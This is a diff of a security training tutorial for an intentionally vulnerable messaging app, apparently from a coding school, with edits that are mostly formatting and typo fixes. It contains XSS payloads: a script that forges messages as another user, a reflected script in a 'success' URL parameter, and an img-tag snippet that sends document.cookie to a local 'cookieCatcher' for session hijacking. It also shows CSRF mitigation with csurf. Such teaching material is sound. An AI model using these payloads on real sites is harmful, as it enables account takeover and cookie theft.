@@ -13,46 +13,44 @@ Unfortunately, it is vulnerable to Cross-Site Scripting (XSS) attacks.
 ### a. Running JavaScript as someone else
 
 The message body is not sanitized (i.e. escaped) before being rendered to the
-page.
-First we will exploit this vulnerability by making people send messages without
-their knowledge.
+page. First we will exploit this vulnerability by making people send messages
+without their knowledge.
 
 1. Create a new user, we'll call this `User A`.
-1. Send this message to `User A` from `User A`, refresh the page and check
-   your console. You should see a message!
+1. Send this message to `User A` from `User A`, refresh the page and check your
+console. You should see a message!
 
-  ```html
-  <script>
-    console.log("I'm in your browser, running your JavaScripts");
-  </script>
-  ```
+    ```html
+    <script>
+      console.log("I'm in your browser, running your JavaScripts");
+    </script>
+    ```
 
-1. Make the `User A` send a message to via XSS. <br>
-  Switch the `console.log()` statement with a `$.ajax()` call to
-  make the same kind of `POST` request that the Send Message form
-  on this page is making.
+1. Make `User A` send a message to another user, `User B`, which we will create
+in a while, via XSS. <br> Switch the `console.log()` statement with a `$.ajax()`
+call to make the same kind of `POST` request that the Send Message form on this
+page is making.
 
-  ```html
-  <script>
-    $.ajax('/url of this page', {
-      method: 'post',
-      data: {
-        // Form data goes here
-      }
-    })
-  </script>
-  ```
-1. [Logout](https://steal-this-app-horizons.herokuapp.com/exercise2/logout)
-  and create a new user, `User B`.
-1. Send a specially crafted message from `User B` to `User A` and make sure
-  that you can use the same attack across users.
+    ```html
+    <script>
+      $.ajax('/url of this page', {
+        method: 'post',
+        data: {
+          // Form data goes here
+        }
+      })
+    </script>
+    ```
+
+1. [Logout](https://steal-this-app-horizons.herokuapp.com/exercise2/logout) and
+create a new user, `User B`.
+1. Send a specially crafted message from `User B` to `User A` and make sure that
+you can use the same attack across users.
 
 ### b. Drive by: running JavaScript as someone else
 
 There's another thing that's vulnerable on this page: the `success` query
-parameter.
-This parameter is also not sanitized before being rendered to the page, so
-we can run JavaScript with it to.
+parameter. This parameter is also not sanitized before being rendered to the page, so we can run JavaScript with it too!
 
 1. [Success messages under normal operation](http://steal-this-app-horizons.herokuapp.com/exercise2/messenger?success=YOUR%20MESSAGE%20HERE)
 1. [Whoops this link runs JavaScript](http://steal-this-app-horizons.herokuapp.com/exercise2/messenger?success=%3Cscript%3Econsole.log%28'Another%20day%2C%20another%20XSS'%29%3C%2Fscript%3E)
@@ -80,31 +78,32 @@ page containing the &lt;script&gt; tag. Cookies are accessible (by default) in
 JavaScript via `document.cookie`. So if we craft the right script tag, we can
 steal their cookie!
 
-  ```html
-  <script>
-    console.log('I can see your cookies!', document.cookies);
-  </script>
-  ```
+```html
+<script>
+  console.log('I can see your cookies!', document.cookie);
+</script>
+```
 
 1. Clone the [Attacker companion to Steal This App](https://github.com/horizons-school-of-technology/attacker-steal-this-app)
 1. Start this app on your localhost and visit [http://localhost:3000/cookieCatcher](http://localhost:3000/cookieCatcher), you should see a message in your console
 
-  ```
-  !!!Cookie catcher!!!
-  ```
+    ```
+    !!!Cookie catcher!!!
+    ```
 
 1. We're going to use this endpoint to transmit the stolen cookie back to
   us. We can then use the cookie to impersonate the user.
 1. Create a specially crafted message or a URL that creates an `img`
   tag and appends it to the body. We're going to store `document.cookie`
-  inside the `src` attribute og this image.
+  inside the `src` attribute of this image.
 
-  ```javascript
-  var img = $('<img>');
-  // Read and submit this cookie via the img tag
-  img.attr('src', "http://localhost:3000/cookieCatcher?cookie=") // you need to edit this line to pass the cookies to your server. 
-  $('body').append(img); // this will append the HTML element into the DOM and therefore fire a GET request to the URL above.
-  ```
+    ```javascript
+    var img = $('<img>');
+    // Read and submit this cookie via the img tag
+    img.attr('src', "http://localhost:3000/cookieCatcher?cookie=") // you need to edit this line to pass the cookies to your server.
+    $('body').append(img); // this will append the HTML element into the DOM and therefore fire a GET request to the URL above.
+    ```
+
 1. Note the value of the cookie in the command line. Use either
   the DevTools console or a Chrome Plugin to create the same cookie
   on Steal This App in an incognito window thereby impersonating the
@@ -190,31 +189,31 @@ We will use the NPM package `csurf` to accomplish this.
 
 1. Add `csurf` to your `app.js`
 
-  ```javascript
-  var csrf = require('csurf')();
-  app.use(csrf);
-  ```
+    ```javascript
+    var csrf = require('csurf')();
+    app.use(csrf);
+    ```
 
 1. Now all your `GET` requests will contain a new property `req.csrfToken()`
   which you can render as a hidden form field.
 
-  **Route**
+    **Route**
 
-  ```javascript
-  app.use('/route', function(req, res) {
-    res.render('template', {
-      _csrf: req.csrfToken()
+    ```javascript
+    app.use('/route', function(req, res) {
+      res.render('template', {
+        _csrf: req.csrfToken()
+      });
     });
-  });
-  ```
+    ```
 
-  **Template**
+    **Template**
 
-  ```html
-  <form method="post">
-    <input type="hidden" name="_csrf" value="{{csrfToken}}">
-  </form>
-  ```
+    ```html
+    <form method="post">
+      <input type="hidden" name="_csrf" value="{{csrfToken}}">
+    </form>
+    ```
 
 1. `POST` requests without a valid token in the `_csrf` field will now be
   automatically rejected.
